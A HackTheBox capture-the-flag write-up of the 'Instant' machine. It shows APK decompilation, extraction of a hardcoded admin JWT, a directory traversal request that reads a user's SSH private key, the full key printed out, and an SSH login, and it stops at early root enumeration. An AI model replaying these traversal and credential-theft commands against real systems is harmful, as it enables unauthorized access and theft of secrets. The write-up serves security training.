---
render_with_liquid: false
title: HackTheBox Writeup  Instant
date: 2024-12-20 06:48:42 +1400
tags: [hackthebox, nmap, linux, feroxbuster, apk, java, apktool, jadx, reversing, gitleaks, discover-secrets, jwt, api, httpx, swagger-ui, python, python-flask, directory-traversal, solar-putty, solar-putty-session, sqlite, hashcat]
---



Instant is a medium difficulty machine that includes reverse engineering a mobile application, exploiting API endpoints, and cracking encrypted hashes and files. Players will analyze an APK to extract sensitive information and a hardcoded authorization token, then they will exploit an API endpoint vulnerable to Arbitrary File Read. Finally, they will achieve full system compromise by decrypting and analyzing encrypted session data from Solar-PuTTY.

# Recon
---

## Hosts

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ pt init '10.10.11.37 instant.htb mywalletv1.instant.htb swagger-ui.instant.htb'
+---------+--------+-------------+------------------------+
| PROFILE | STATUS |     IP      |         DOMAIN         |
+---------+--------+-------------+------------------------+
| instant | on     | 10.10.11.37 | instant.htb            |
| instant | on     | 10.10.11.37 | mywalletv1.instant.htb |
| instant | on     | 10.10.11.37 | swagger-ui.instant.htb |
+---------+--------+-------------+------------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Fri Dec 20 06:48:42 2024 as: /usr/lib/nmap/nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80, 10.10.11.37
Nmap scan report for 10.10.11.37
Host is up, received user-set (0.20s latency).
Scanned at 2024-12-20 06:48:42 CST for 13s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMM6fK04LJ4jNNL950Ft7YHPO9NKONYVCbau/+tQKoy3u7J9d8xw2sJaajQGLqTvyWMolbN3fKzp7t/s/ZMiZNo=
|   256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIL+zjgyGvnf4lMAlvdgVHlwHd+/U4NcThn1bx5/4DZYY
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.58
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Fri Dec 20 06:48:55 2024 -- 1 IP address (1 host up) scanned in 13.30 seconds
```

## 80 - HTTP : Instant Wallet APK download


### Info

```ruby
http://instant.htb [200] [Instant Wallet] [Apache/2.4.58 (Ubuntu)] [9595f529623a32437338ec55d7acbe5c74e24598] [Apache HTTP Server:2.4.58,Bootstrap:4.0.0,Cloudflare,Popper:1.12.9,Slick:1.8.1,Ubuntu,cdnjs,jQuery,jQuery CDN]
```

![](/assets/obsidian/98f7e93c538587a82a3bab84adff00c0.png)

### Directory

```bash
feroxbuster -w <(cat /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt|anew) -k --auto-tune -A -u "http://$(pt get rhost):80" -o ferox_80.txt -n
```

```bash
301      GET        9l       28w      307c http://instant.htb/js => http://instant.htb/js/
301      GET        9l       28w      308c http://instant.htb/css => http://instant.htb/css/
200      GET       73l      165w     2022c http://instant.htb/js/scripts.js
200      GET       49l      241w    13102c http://instant.htb/img/logo.png
301      GET        9l       28w      308c http://instant.htb/img => http://instant.htb/img/
200      GET      337l     1155w    16379c http://instant.htb/index.html
200      GET      245l     1305w   143898c http://instant.htb/img/blog-1.jpg
200      GET      195l     1097w   116351c http://instant.htb/img/blog-2.jpg
200      GET      434l     2599w   304154c http://instant.htb/img/blog-3.jpg
301      GET        9l       28w      315c http://instant.htb/javascript => http://instant.htb/javascript/
200      GET     7852l    19986w   199577c http://instant.htb/css/default.css
301      GET        9l       28w      314c http://instant.htb/downloads => http://instant.htb/downloads/
200      GET      337l     1155w    16379c http://instant.htb/
200      GET    18696l   115382w  9319615c http://instant.htb/downloads/instant.apk
```

# User Flag
---

## Shell as shirohige


### Disassemble APK file

```bash
wget http://instant.htb/downloads/instant.apk -O dump/instant.apk
```

> **Tools for reverse engineering APK files**
> - **apktool** - Disassemble full resource files from APK
> - **jadx** - A CLI tool to decompile APK and output to source code (`.java`), only extract partial resource files
> - **jadx-gui** - GUI version of **jadx**
{: .prompt-tip }

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ apktool d dump/instant.apk -o apktool_instant
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
I: Using Apktool 2.6.0 on instant.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/kali/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ jadx $(realpath dump/instant.apk) -d $(realpath jadx_instant)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
INFO  - loading ...
INFO  - processing ...
ERROR - finished with errors, count: 13
```

### Analyze APK

Check resource files, discovered 2 virtual hosts : `mywalletv1.instant.htb`, `swagger-ui.instant.htb`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ ls -latr apktool_instant/res/xml
total 20
-rw-r--r--   1 bravosec kali  108 Dec 21 00:20 data_extraction_rules.xml
-rw-r--r--   1 bravosec kali  311 Dec 21 00:20 network_security_config.xml
-rw-r--r--   1 bravosec kali   62 Dec 21 00:20 backup_rules.xml
drwxr-xr-x   2 bravosec kali 4096 Dec 21 00:20 .
drwxr-xr-x 140 bravosec kali 4096 Dec 21 00:20 ..

┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ cat apktool_instant/res/xml/*
<?xml version="1.0" encoding="utf-8"?>
<full-backup-content /><?xml version="1.0" encoding="utf-8"?>
<data-extraction-rules>
    <cloud-backup />
</data-extraction-rules><?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config> 
```

Check for secrets in source code

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ gitleaks --no-banner detect -r gitleaks.json -v --no-git -s jadx_instant
Finding:     KeyCycleOscillator keyCycleOscillator6 = keyCycleOscillator5;
Secret:      keyCycleOscillator5
RuleID:      generic-api-key
Entropy:     3.681881
File:        jadx_instant/sources/androidx/constraintlayout/core/motion/Motion.java
Line:        1221
Fingerprint: jadx_instant/sources/androidx/constraintlayout/core/motion/Motion.java:generic-api-key:1221

Finding:     ...r("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ...").build()).enqueue(n...
Secret:      eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ...
RuleID:      jwt
Entropy:     5.612595
File:        jadx_instant/sources/com/instantlabs/instant/AdminActivities.java
Line:        15
Fingerprint: jadx_instant/sources/com/instantlabs/instant/AdminActivities.java:jwt:15

12:27AM INF scan completed in 2.54s
12:27AM WRN leaks found: 2
```

Got administrator's **JWT** from `Authorization` header from a request to `http://mywalletv1.instant.htb/api/v1/view/profile`

> `jadx_instant/sources/com/instantlabs/instant/AdminActivities.java`

```bash
package com.instantlabs.instant;

import com.google.gson.JsonParser;
import com.google.gson.JsonSyntaxException;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

/* loaded from: classes.dex */
public class AdminActivities {
    private String TestAdminAuthorization() {
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
            static final /* synthetic */ boolean $assertionsDisabled = false;

            @Override // okhttp3.Callback
            public void onFailure(Call call, IOException iOException) {
                System.out.println("Error Here : " + iOException.getMessage());
            }

            @Override // okhttp3.Callback
            public void onResponse(Call call, Response response) throws IOException {
                if (response.isSuccessful()) {
                    try {
                        System.out.println(JsonParser.parseString(response.body().string()).getAsJsonObject().get("username").getAsString());
                    } catch (JsonSyntaxException e) {
                        System.out.println("Error Here : " + e.getMessage());
                    }
                }
            }
        });
        return "Done";
    }
}
```

The **JWT** is valid

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ curl http://mywalletv1.instant.htb/api/v1/view/profile -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA'
{"Profile":{"account_status":"active","email":"admin@instant.htb","invite_token":"instant_admin_inv","role":"Admin","username":"instantAdmin","wallet_balance":"10000000","wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},"Status":200}
```

The **JWT** is valid until `3023-12-12 23:27:36 (UTC)`, no other interesting payload values

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ python /opt/sectools/web/JWT/jwt_tool/jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA'

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi

Original JWT:

=====================
Decoded Token Values:
=====================

Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] id = 1
[+] role = "Admin"
[+] walId = "f0eca6e5-783a-471d-9d8f-0162cbc900db"
[+] exp = 33259303656    ==> TIMESTAMP = 3023-12-12 23:27:36 (UTC)

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------
```

Check all other URL endpoints from source code

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ cd jadx_instant

┌──(bravosec㉿fsociety)-[~/htb/Instant/jadx_instant]
└─$ grep -rinE 'http://|https://' | grep 'instant.htb'
grep: resources/lib/x86_64/libpl_droidsonroids_gif.so: binary file matches
grep: resources/lib/x86/libpl_droidsonroids_gif.so: binary file matches
grep: resources/lib/armeabi-v7a/libpl_droidsonroids_gif.so: binary file matches
grep: resources/lib/arm64-v8a/libpl_droidsonroids_gif.so: binary file matches
grep: resources/classes.dex: binary file matches
sources/com/instantlabs/instant/LoginActivity.java:71:        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/login").post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.LoginActivity.4
sources/com/instantlabs/instant/ProfileActivity.java:39:            new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", accessToken).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.ProfileActivity.1
sources/com/instantlabs/instant/RegisterActivity.java:66:        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/register").post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.RegisterActivity.3
sources/com/instantlabs/instant/TransactionActivity.java:60:        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/initiate/transaction").addHeader("Authorization", str4).post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new AnonymousClass2(str5, str4));
sources/com/instantlabs/instant/TransactionActivity.java:94:                        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/confirm/pin").header("Authorization", this.val$access_token).post(RequestBody.create(MediaType.parse("application/json"), jsonObject.toString())).build()).enqueue(new Callback() { // from class: com.instantlabs.instant.TransactionActivity.2.2
sources/com/instantlabs/instant/AdminActivities.java:15:        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() { // from class: com.instantlabs.instant.AdminActivities.1
```

### 80 - swagger-ui.instant.htb : Directory traversal

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ URL="swagger-ui.instant.htb"; echo $URL | httpx -random-agent -td -server -title -fr -sc -hash sha1 -silent -ss -timeout 20 -srd "httpx_${URL}" -o "httpx_${URL}.log"
http://swagger-ui.instant.htb [302,308,200] [Instant API - Transfer Funds Without Limits!] [Werkzeug/3.0.3 Python/3.12.3] [http://swagger-ui.instant.htb/apidocs/] [6a6f58fae81e50765339b2da66b260da6879f7b8] [Flask:3.0.3,Python:3.12.3,React,Swagger UI,jQuery]
```

> http://swagger-ui.instant.htb/apidocs/

- The swagger API document reveals all endpoints
- `Logs` functions looks interesting, check them out

![](/assets/obsidian/6d695b05ce446769e2583886048d1cb2.png)

List logs, discovered a directory `/home/shirohige/logs`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ curl -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' -H "accept: application/json" "http://swagger-ui.instant.htb/api/v1/admin/view/logs" -X GET
{"Files":["1.log"],"Path":"/home/shirohige/logs/","Status":201}
```

Check a specific log

![](/assets/obsidian/9c5fa78ceb3497709c67e312d1862fdb.png)

![](/assets/obsidian/63e4a38fed3022a090f91f2c67807fdf.png)

`/home/shirohige/logs/1.log` is just a test file

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ curl -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' -H "accept: application/json" "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=1.log" -X GET
{"/home/shirohige/logs/1.log":["This is a sample log testing\n"],"Status":201}
```

Try directory traversal to get `shirohige`'s ssh private key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ curl -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' -H "accept: application/json" "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa" -X GET
{"/home/shirohige/logs/../.ssh/id_rsa":["-----BEGIN OPENSSH PRIVATE KEY-----\n","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\n","-----END OPENSSH PRIVATE KEY-----\n"],"Status":201}
```

Parse the private key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ curl -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' -H "accept: application/json" "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa" -X GET -s | jq -s '.[]."/home/shirohige/logs/../.ssh/id_rsa".[]' -r | sed '/^[[:space:]]*$/d' | tee loot/shirohige.id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

### 22 - SSH

SSH as `shirohige` via the private key

```bash
┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ chmod 600 ./loot/shirohige.id_rsa

┌──(bravosec㉿fsociety)-[~/htb/Instant]
└─$ ssh -i ./loot/shirohige.id_rsa shirohige@instant.htb
Warning: Permanently added 'instant.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Dec 20 15:51:57 2024 from 10.10.16.68
shirohige@instant:~$ id
uid=1001(shirohige) gid=1002(shirohige) groups=1002(shirohige),1001(development)
shirohige@instant:~$ cat user.txt
c1b2dc83c43db1434e6365d47d559196
```

# Root Flag
---

## From shirohige to root


### Enumeration : Discovered Solar-PuTTY session file

Users with shell

```bash
shirohige@instant:~$ for u in $(cat /etc/passwd | grep sh$ | cut -d":" -f1 2>/dev/null);do id $u;done 2>/dev/null | sort -unt '=' -k2
uid=0(root) gid=0(root) groups=0(root)
uid=1001(shirohige) gid=1002(shirohige) groups=1002(shirohige),1001(development)
```

Netstat

```bash
shirohige@instant:~$ ss -ltnp | awk '$4 !~ /0.0.0.0|::/'
